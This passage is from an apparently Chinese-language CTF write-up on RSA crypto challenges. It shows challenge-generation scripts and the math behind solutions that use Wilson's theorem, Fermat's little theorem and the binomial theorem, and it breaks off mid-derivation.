class="mspace newline"></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">o</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">o</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">−</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span></span></p><p>所以noise只需要计算p到q-1对q的逆再乘-1即可。以下是数据生成脚本。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> bytes_to_long<span class="token punctuation">,</span> inverse<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> next_prime<span class="token comment"># length of flag is 37</span>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>q <span class="token operator">=</span> next_prime<span class="token punctuation">(</span>p<span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qnoise <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token comment">#for i in range(1, p):</span><span class="token comment">#    noise = (noise * i) % q</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">:</span>    noise <span class="token operator">=</span> <span class="token punctuation">(</span>noise <span class="token operator">*</span> i<span class="token punctuation">)</span> <span class="token operator">%</span> qnoise <span class="token operator">=</span> inverse<span class="token punctuation">(</span>noise<span class="token punctuation">,</span> q<span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">65537</span>m <span class="token operator">=</span> noise <span class="token operator">*</span> flag <span class="token operator">%</span> nc <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="fermat-with-binomial">Fermat with Binomial</h3><p>这题是一个改编题，有的同学搜一下就能找到做法了，其实自己做还是比较难想的。这题需要用到费马小定理和高中学的二项式定理。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">65537</span>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qc <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>hint1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2021</span> <span class="token operator">*</span> p <span class="token operator">+</span> q<span class="token punctuation">,</span> <span class="token number">20212021</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>hint2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">1010</span> <span class="token operator">*</span> p <span class="token operator">+</span> <span class="token number">1011</span><span class="token punctuation">,</span> q<span class="token punctuation">,</span> n<span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'message.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'n=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span></span><span class="token string">\n'</span></span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'c=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">\n'</span></span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'hint1=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>hint1<span class="token punctuation">&#125;</span></span><span class="token string">\n'</span></span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'hint2=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>hint2<span class="token punctuation">&#125;</span></span><span class="token string">\n'</span></span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们有如下等式</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mn>1</mn><mo>≡</mo><mo stretchy="false">(</mo><mn>2021</mn><mi>p</mi><mo>+</mo><mi>q</mi><msup><mo stretchy="false">)</mo><mn>20212021</mn></msup><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>h</mi><mn>2</mn><mo>≡</mo><mo stretchy="false">(</mo><mn>1010</mn><mi>p</mi><mo>+</mo><mn>1011</mn><msup><mo stretchy="false">)</mo><mi>q</mi></msup><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h1\equiv(2021p+q)^{20212021}\pmod n\\h2\equiv(1010p+1011)^q\pmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">1</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714392em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></span></p><p>先对第一个式子处理，由二项式定理我们可以知道，对于这个式子展开后，除了第一项和最后一项，其余都是有p*q的，所以在模n下，这些中间项都可以消去。于是，第一个式子可以写成如下形式：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mn>1</mn><mo>≡</mo><mo stretchy="false">(</mo><mn>2021</mn><mi>p</mi><msup><mo stretchy="false">)</mo><mn>20212021</mn></msup><mo>+</mo><msup><mi>q</mi><mn>20212021</mn></msup><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h1\equiv(2021p)^{20212021}+q^{20212021}\pmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">1</span><span class="mord mathdefault">p</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></span></p><p>对于第二个式子，看到其指数有q，想到费马小定理，先把第二个式子写成等式，然后对其模q，再使用费马小定理</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mn>2</mn><mo>=</mo><mo stretchy="false">(</mo><mn>1010</mn><mi>p</mi><mo>+</mo><mn>1011</mn><msup><mo stretchy="false">)</mo><mi>q</mi></msup><mo>+</mo><mi>k</mi><mi>n</mi><mo>=</mo><mo stretchy="false">(</mo><mn>1010</mn><mi>p</mi><mo>+</mo><mn>1011</mn><msup><mo stretchy="false">)</mo><mi>q</mi></msup><mo>+</mo><mi>k</mi><mi>p</mi><mo>∗</mo><mi>q</mi><mspace linebreak="newline"></mspace><mi>h</mi><mn>2</mn><mo>≡</mo><mo stretchy="false">(</mo><mn>1010</mn><mi>p</mi><mo>+</mo><mn>1011</mn><msup><mo stretchy="false">)</mo><mi>q</mi></msup><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>q</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>h</mi><mn>2</mn><mo>≡</mo><mn>1010</mn><mi>p</mi><mo>+</mo><mn>1011</mn><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h2=(1010p+1011)^q+kn=(1010p+1011)^q+kp*q\\h2\equiv(1010p+1011)^q\pmod q\\h2\equiv1010p+1011\pmod q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714392em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714392em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.714392em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span></span></p><p>于是，我们把hint2写成如下形式</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mn>2</mn><mo>−</mo><mn>1011</mn><mo>=</mo><mn>1010</mn><mi>p</mi><mo>+</mo><mi>k</mi><mi>q</mi></mrow><annotation encoding="application/x-tex">h2-1011=1010p+kq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">h</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span></span></span></span></span></p><p>对其模n，同时取其20212021次方，同样的由费马小定理，可以去掉中间项</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>h</mi><mn>2</mn><mo>−</mo><mn>1011</mn><msup><mo stretchy="false">)</mo><mn>20212021</mn></msup><mo>≡</mo><mo stretchy="false">(</mo><mn>1010</mn><mi>p</mi><msup><mo stretchy="false">)</mo><mn>20212021</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mi>k</mi><mi>q</mi><msup><mo stretchy="false">)</mo><mn>20212021</mn></msup><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(h2-1011)^{20212021}\equiv (1010p)^{20212021}+(kq)^{20212021}\pmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">h</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span><span class="mord mathdefault">p</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" 